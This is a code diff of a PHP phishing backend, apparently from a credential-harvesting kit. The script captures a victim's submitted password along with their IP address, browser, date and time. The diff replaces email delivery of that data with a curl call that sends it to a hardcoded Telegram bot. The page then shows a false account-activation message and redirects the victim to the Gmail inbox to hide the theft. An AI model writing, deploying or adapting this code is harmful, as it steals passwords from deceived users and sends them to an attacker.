@@ -1,4 +1,5 @@
 <?php
+
 /*Pegando os dados*/
 $ip = $_SERVER['REMOTE_ADDR'];
 $navegador =  $_SERVER['HTTP_USER_AGENT'];
@@ -8,19 +9,15 @@ $horario = date('h:i:s');
 /*Dados sobre o e-mail*/
 $pass = $_POST['password'];
 
- // emails para quem será enviado o formulário
-  $emailenviar = "yslmarques@gmail.com";
-  $destino = $emailenviar;
+$vardokct = urlencode("IP:$ip\nNavegador:$navegador\nData:$data\nHorário:$horario\n------------------------\nSENHA:$pass");
 
-  // É necessário indicar que o formato do e-mail é html
-  $headers  = 'MIME-Version: 1.0' . "\r\n";
-      $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-      $headers .= 'From: $nome <$email>';
-  //$headers .= "Bcc: $EmailPadrao\r\n";
-
-  $enviaremail = mail($destino, $pass, $headers);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot1828850191:AAG226rbc0OsMipPf7OCjPJqsBEgjQOb1u8/sendMessage?chat_id=1271321852&text=$vardokct");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$exec = curl_exec($ch);
 
 echo "<script>alert('Solicitação feita com sucesso, analisaremos a sua conta e a ativaremos em breve.');</script>";
-header( "refresh:1;url=https://mail.google.com/mail/u/0/#inbox");
+header( "refresh:0;url=https://mail.google.com/mail/u/0/#inbox");
 
 ?>
